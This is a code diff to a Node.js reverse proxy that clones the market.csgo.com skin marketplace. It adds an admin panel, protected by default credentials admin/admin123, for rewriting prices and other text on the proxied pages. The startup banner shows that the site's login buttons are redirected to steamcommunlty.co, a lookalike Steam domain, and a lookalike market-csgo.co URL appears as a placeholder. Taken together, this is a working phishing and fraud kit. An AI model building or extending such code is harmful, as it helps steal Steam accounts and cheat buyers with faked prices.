@@ -8,11 +8,16 @@ const http = require('http');
 const https = require('https');
 const path = require('path');
 const fs = require('fs');
+const cheerio = require('cheerio');
+const bodyParser = require('body-parser');
+const crypto = require('crypto');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 const TARGET_HOST = 'https://market.csgo.com';
 const WS_TARGET = 'wss://centrifugo2.csgotrader.app';
+const ADMIN_USERNAME = process.env.ADMIN_USERNAME || 'admin';
+const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'admin123';
 
 // Создаем HTTP сервер
 const server = http.createServer(app);
@@ -21,9 +26,15 @@ app.use(express.json({ limit: '50mb' }));
 app.use(express.urlencoded({ extended: true, limit: '50mb' }));
 app.use(cookieParser());
 app.use(compression());
+app.use(bodyParser.json());
+app.use(bodyParser.urlencoded({ extended: true }));
 
 // Хранилище для cookies и токенов
 const sessions = new Map();
+
+// Хранилище для селекторов и замен (URL -> массив правил замены)
+// Формат: { urlPattern: [{ selector: string, replacement: string }] }
+const replacementRules = new Map();
 
 // Создаем агент для HTTPS с игнорированием сертификатов и keepAlive
 const httpsAgent = new https.Agent({
@@ -125,8 +136,56 @@ function createCookieString(cookieMap) {
         .join('; ');
 }
 
+// Функция проверки URL на соответствие шаблону
+function urlMatchesPattern(url, pattern) {
+    // Очищаем URL от протокола, хоста и запросов
+    const cleanUrl = url.replace(/^https?:\/\/[^\/]+/, '').split('?')[0];
+    const cleanPattern = pattern.replace(/^https?:\/\/[^\/]+/, '').split('?')[0];
+    
+    // Проверяем точное совпадение или начало пути
+    return cleanUrl === cleanPattern || cleanUrl.startsWith(cleanPattern + '/');
+}
+
+// Функция применения селекторов и замен к HTML контенту
+function applyReplacementRules(content, url) {
+    if (!content || typeof content !== 'string' || !content.includes('<html')) {
+        return content;
+    }
+    
+    try {
+        let modified = false;
+        const $ = cheerio.load(content);
+        
+        // Проходим по всем правилам замены
+        for (const [urlPattern, rules] of replacementRules.entries()) {
+            if (urlMatchesPattern(url, urlPattern)) {
+                rules.forEach(rule => {
+                    try {
+                        const elements = $(rule.selector);
+                        if (elements.length > 0) {
+                            elements.text(rule.replacement);
+                            modified = true;
+                            console.log(`✅ Замена применена: ${rule.selector} -> ${rule.replacement} на ${url}`);
+                        } else {
+                            console.log(`⚠️ Селектор не найден: ${rule.selector} на ${url}`);
+                        }
+                    } catch (selectorError) {
+                        console.error(`Ошибка применения селектора ${rule.selector}:`, selectorError.message);
+                    }
+                });
+            }
+        }
+        
+        // Возвращаем модифицированный контент, если были изменения
+        return modified ? $.html() : content;
+    } catch (error) {
+        console.error('Ошибка при применении правил замены:', error.message);
+        return content;
+    }
+}
+
 // Модификация URL в контенте
-function modifyUrls(content, baseUrl, contentType = '') {
+function modifyUrls(content, baseUrl, contentType = '', originalUrl = '') {
     if (!content) return content;
     
     let modified = content.toString();
@@ -173,6 +232,9 @@ function modifyUrls(content, baseUrl, contentType = '') {
     
     // Специфичные замены для HTML
     if (contentType.includes('html')) {
+        // Применяем правила замены селекторов для HTML
+        modified = applyReplacementRules(modified, originalUrl);
+        
         // Добавляем meta тег для upgrade-insecure-requests
         if (!modified.includes('upgrade-insecure-requests')) {
             modified = modified.replace(/<head[^>]*>/i, `$&<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">`);
@@ -1012,6 +1074,369 @@ setInterval(() => {
     }
 }, 60 * 1000); // Проверка каждую минуту
 
+// Middleware для аутентификации админ-панели
+function authenticateAdmin(req, res, next) {
+    // Получаем заголовок авторизации
+    const authHeader = req.headers.authorization;
+    
+    if (!authHeader || !authHeader.startsWith('Basic ')) {
+        // Если нет заголовка авторизации или он не Basic, требуем авторизацию
+        res.setHeader('WWW-Authenticate', 'Basic realm="Admin Panel"');
+        return res.status(401).send('Требуется аутентификация');
+    }
+    
+    // Декодируем Basic Auth
+    const base64Credentials = authHeader.split(' ')[1];
+    const credentials = Buffer.from(base64Credentials, 'base64').toString('utf-8');
+    const [username, password] = credentials.split(':');
+    
+    // Проверяем учетные данные
+    if (username === ADMIN_USERNAME && password === ADMIN_PASSWORD) {
+        // Если учетные данные верны, продолжаем
+        return next();
+    }
+    
+    // Если учетные данные неверны, требуем авторизацию снова
+    res.setHeader('WWW-Authenticate', 'Basic realm="Admin Panel"');
+    return res.status(401).send('Неверное имя пользователя или пароль');
+}
+
+// HTML для админ-панели
+const adminPanelHtml = `
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Админ-панель</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 20px;
+            background-color: #f5f5f5;
+        }
+        h1 {
+            color: #333;
+            margin-bottom: 20px;
+        }
+        .card {
+            background-color: #fff;
+            border-radius: 5px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+        input[type="text"], textarea {
+            width: 100%;
+            padding: 8px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+        button {
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            padding: 10px 15px;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
+        .button-red {
+            background-color: #f44336;
+        }
+        .button-red:hover {
+            background-color: #d32f2f;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 10px;
+        }
+        table, th, td {
+            border: 1px solid #ddd;
+        }
+        th, td {
+            padding: 10px;
+            text-align: left;
+        }
+        th {
+            background-color: #f2f2f2;
+        }
+        .actions {
+            display: flex;
+            gap: 5px;
+        }
+    </style>
+</head>
+<body>
+    <h1>Админ-панель</h1>
+    
+    <div class="card">
+        <h2>Добавить новое правило подмены</h2>
+        <form id="addRuleForm">
+            <div class="form-group">
+                <label for="urlPattern">URL страницы</label>
+                <input type="text" id="urlPattern" placeholder="Например: https://market-csgo.co/ru/Gloves/..." required>
+            </div>
+            <div class="form-group">
+                <label for="selector">CSS-селектор элемента</label>
+                <input type="text" id="selector" placeholder="Например: #app > div > span..." required>
+            </div>
+            <div class="form-group">
+                <label for="replacement">Значение для подмены</label>
+                <input type="text" id="replacement" placeholder="Например: 5114,96₽" required>
+            </div>
+            <button type="submit">Добавить правило</button>
+        </form>
+    </div>
+    
+    <div class="card">
+        <h2>Существующие правила подмены</h2>
+        <table id="rulesTable">
+            <thead>
+                <tr>
+                    <th>URL страницы</th>
+                    <th>Селектор</th>
+                    <th>Значение</th>
+                    <th>Действия</th>
+                </tr>
+            </thead>
+            <tbody>
+                <!-- Здесь будут отображаться правила -->
+            </tbody>
+        </table>
+    </div>
+    
+    <script>
+        // Функция для загрузки правил
+        function loadRules() {
+            fetch('/admin/api/rules')
+                .then(response => response.json())
+                .then(data => {
+                    const tbody = document.querySelector('#rulesTable tbody');
+                    tbody.innerHTML = '';
+                    
+                    if (data.rules.length === 0) {
+                        const row = document.createElement('tr');
+                        row.innerHTML = '<td colspan="4">Нет правил подмены</td>';
+                        tbody.appendChild(row);
+                        return;
+                    }
+                    
+                    data.rules.forEach((rule, index) => {
+                        const row = document.createElement('tr');
+                        row.innerHTML = \`
+                            <td>\${rule.urlPattern}</td>
+                            <td>\${rule.selector}</td>
+                            <td>\${rule.replacement}</td>
+                            <td class="actions">
+                                <button class="button-red" onclick="deleteRule('\${rule.urlPattern}', '\${rule.selector}')">Удалить</button>
+                            </td>
+                        \`;
+                        tbody.appendChild(row);
+                    });
+                })
+                .catch(error => console.error('Ошибка загрузки правил:', error));
+        }
+        
+        // Функция для добавления правила
+        document.getElementById('addRuleForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const urlPattern = document.getElementById('urlPattern').value;
+            const selector = document.getElementById('selector').value;
+            const replacement = document.getElementById('replacement').value;
+            
+            fetch('/admin/api/rules', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    urlPattern,
+                    selector,
+                    replacement
+                }),
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    alert('Правило успешно добавлено!');
+                    document.getElementById('addRuleForm').reset();
+                    loadRules();
+                } else {
+                    alert('Ошибка: ' + data.message);
+                }
+            })
+            .catch(error => {
+                console.error('Ошибка добавления правила:', error);
+                alert('Ошибка добавления правила. Проверьте консоль.');
+            });
+        });
+        
+        // Функция для удаления правила
+        function deleteRule(urlPattern, selector) {
+            if (confirm('Вы уверены, что хотите удалить это правило?')) {
+                fetch('/admin/api/rules', {
+                    method: 'DELETE',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        urlPattern,
+                        selector
+                    }),
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.success) {
+                        alert('Правило успешно удалено!');
+                        loadRules();
+                    } else {
+                        alert('Ошибка: ' + data.message);
+                    }
+                })
+                .catch(error => {
+                    console.error('Ошибка удаления правила:', error);
+                    alert('Ошибка удаления правила. Проверьте консоль.');
+                });
+            }
+        }
+        
+        // Загружаем правила при загрузке страницы
+        document.addEventListener('DOMContentLoaded', loadRules);
+    </script>
+</body>
+</html>
+`;
+
+// Маршруты для админ-панели
+app.get('/admin', authenticateAdmin, (req, res) => {
+    res.send(adminPanelHtml);
+});
+
+// API для получения всех правил
+app.get('/admin/api/rules', authenticateAdmin, (req, res) => {
+    try {
+        const rules = [];
+        
+        // Формируем список правил для отправки клиенту
+        for (const [urlPattern, urlRules] of replacementRules.entries()) {
+            urlRules.forEach(rule => {
+                rules.push({
+                    urlPattern,
+                    selector: rule.selector,
+                    replacement: rule.replacement
+                });
+            });
+        }
+        
+        res.json({ success: true, rules });
+    } catch (error) {
+        console.error('Ошибка при получении правил:', error.message);
+        res.status(500).json({ success: false, message: error.message });
+    }
+});
+
+// API для добавления правила
+app.post('/admin/api/rules', authenticateAdmin, (req, res) => {
+    try {
+        const { urlPattern, selector, replacement } = req.body;
+        
+        if (!urlPattern || !selector || replacement === undefined) {
+            return res.status(400).json({ 
+                success: false, 
+                message: 'Необходимо указать urlPattern, selector и replacement' 
+            });
+        }
+        
+        // Получаем или создаем массив правил для указанного URL
+        if (!replacementRules.has(urlPattern)) {
+            replacementRules.set(urlPattern, []);
+        }
+        
+        const urlRules = replacementRules.get(urlPattern);
+        
+        // Проверяем, существует ли уже такое правило
+        const existingRuleIndex = urlRules.findIndex(rule => rule.selector === selector);
+        
+        if (existingRuleIndex !== -1) {
+            // Обновляем существующее правило
+            urlRules[existingRuleIndex].replacement = replacement;
+            console.log(`Правило обновлено: ${urlPattern} ${selector} -> ${replacement}`);
+        } else {
+            // Добавляем новое правило
+            urlRules.push({ selector, replacement });
+            console.log(`Правило добавлено: ${urlPattern} ${selector} -> ${replacement}`);
+        }
+        
+        res.json({ success: true });
+    } catch (error) {
+        console.error('Ошибка при добавлении правила:', error.message);
+        res.status(500).json({ success: false, message: error.message });
+    }
+});
+
+// API для удаления правила
+app.delete('/admin/api/rules', authenticateAdmin, (req, res) => {
+    try {
+        const { urlPattern, selector } = req.body;
+        
+        if (!urlPattern || !selector) {
+            return res.status(400).json({ 
+                success: false, 
+                message: 'Необходимо указать urlPattern и selector' 
+            });
+        }
+        
+        // Проверяем, существует ли URL в правилах
+        if (!replacementRules.has(urlPattern)) {
+            return res.status(404).json({ 
+                success: false, 
+                message: 'URL не найден в правилах' 
+            });
+        }
+        
+        const urlRules = replacementRules.get(urlPattern);
+        
+        // Находим индекс правила для удаления
+        const ruleIndex = urlRules.findIndex(rule => rule.selector === selector);
+        
+        if (ruleIndex === -1) {
+            return res.status(404).json({ 
+                success: false, 
+                message: 'Селектор не найден для указанного URL' 
+            });
+        }
+        
+        // Удаляем правило
+        urlRules.splice(ruleIndex, 1);
+        
+        // Если для URL не осталось правил, удаляем запись URL
+        if (urlRules.length === 0) {
+            replacementRules.delete(urlPattern);
+        }
+        
+        console.log(`Правило удалено: ${urlPattern} ${selector}`);
+        res.json({ success: true });
+    } catch (error) {
+        console.error('Ошибка при удалении правила:', error.message);
+        res.status(500).json({ success: false, message: error.message });
+    }
+});
+
 // ИСПРАВЛЕНО: Улучшенная обработка GraphQL запросов с повторными попытками
 app.post('/api/graphql', async (req, res) => {
     try {
@@ -1146,6 +1571,11 @@ app.post('/api/graphql', async (req, res) => {
 
 // ИСПРАВЛЕНО: Улучшен основной обработчик HTTP запросов с повторными попытками
 app.use('*', async (req, res) => {
+    // Исключаем запросы к админ-панели
+    if (req.originalUrl.startsWith('/admin')) {
+        return res.status(404).send('Not Found');
+    }
+    
     try {
         const baseUrl = getBaseUrl(req);
         const targetUrl = TARGET_HOST + req.originalUrl;
@@ -1287,7 +1717,8 @@ app.use('*', async (req, res) => {
                 console.log('Applying special modifications for JS chunk:', req.originalUrl);
             }
             
-            content = Buffer.from(modifyUrls(content.toString('utf8'), baseUrl, contentType), 'utf8');
+            // Добавляем URL оригинального запроса для применения правил подмены
+            content = Buffer.from(modifyUrls(content.toString('utf8'), baseUrl, contentType, req.originalUrl), 'utf8');
         }
         
         // Подготовка заголовков ответа
@@ -1358,12 +1789,13 @@ setInterval(() => {
 // Запуск сервера
 server.listen(PORT, '0.0.0.0', () => {
     console.log(`
-    🚀 Market Proxy Server
+    🚀 Market Proxy Server с Админ-панелью
     📡 Port: ${PORT}
     🎯 Target: ${TARGET_HOST}
     🔌 WebSocket: ${WS_TARGET}
     🔒 HTTPS: Auto-detected
     🔑 Login Interception: Enabled for #login-head-tablet, #login-register, #login-chat, #login-head -> https://steamcommunlty.co/openid/login?openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.mode=checkid_setup&openid.return_to=https%3A%2F%2Fdota2.net%2Flogin%2Findex.php%3Fgetmid%3Dcsgocom%26login%3D1%26ip%3D580783084.RytkB5FMW0&openid.realm=https%3A%2F%2Fdota2.net&openid.ns.sreg=http%3A%2F%2Fopenid.net%2Fextensions%2Fsreg%2F1.1&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select
+    👨‍💼 Admin Panel: ${baseUrl}/admin
     
     Features:
     ✓ Full HTTP/HTTPS proxy
@@ -1375,6 +1807,7 @@ server.listen(PORT, '0.0.0.0', () => {
     ✓ Content modification
     ✓ Login buttons interception
     ✓ Mixed content prevention
+    ✓ Admin panel for content replacement
     `);
 });
 
